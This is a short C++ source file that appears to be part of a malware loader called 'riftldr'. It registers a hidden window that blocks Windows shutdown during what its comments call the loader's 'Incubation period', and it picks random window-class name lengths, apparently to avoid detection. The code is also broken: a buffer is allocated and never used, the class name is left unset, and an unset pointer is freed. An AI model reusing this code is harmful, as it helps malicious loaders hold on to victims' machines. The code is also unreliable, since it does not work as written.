#include "riftldr.h"

// DummyWindow Proc that monitors Windows' activity (shuting down etc)
// this will be used in order to prevent the loader from accidentally
// bricking the system in the Incubation period

LRESULT CALLBACK WndProc(HWND hWnd, uint32 uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_QUERYENDSESSION:
		return FALSE;
	case WM_ENDSESSION:
		break;
	}

	return DefWindowProcW(hWnd, uMsg, wParam, lParam);
}

dword WINAPI thWindowThread(
	_In_ void* lParam
) {
	WNDCLASSEXW wc{};
	wc.cbSize = sizeof(wc);
	wc.lpfnWndProc = WndProc;

	uchar nLength = rng::Xoshiro::Instance().RandomIntDistribution(8, 255);
	PCWSTR pName = (PCWSTR)malloc(nLength);

//	wc.lpszClassName = ;

	RegisterClassExW(&wc);

	HWND hWnd = CreateWindowExW(0, wc.lpszClassName, wc.lpszClassName, WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, 0, 0);
	if (hWnd) {
		MSG mMsg; BOOL bRet;
		while ((bRet = GetMessageW(&mMsg, NULL, 0, 0)) != 0) {
			if (bRet == -1) {
				return 0;
			}
			else {
				TranslateMessage(&mMsg);
				DispatchMessageW(&mMsg);
			}
		}
	}

	free((void*)wc.lpszClassName);
	return TRUE;
}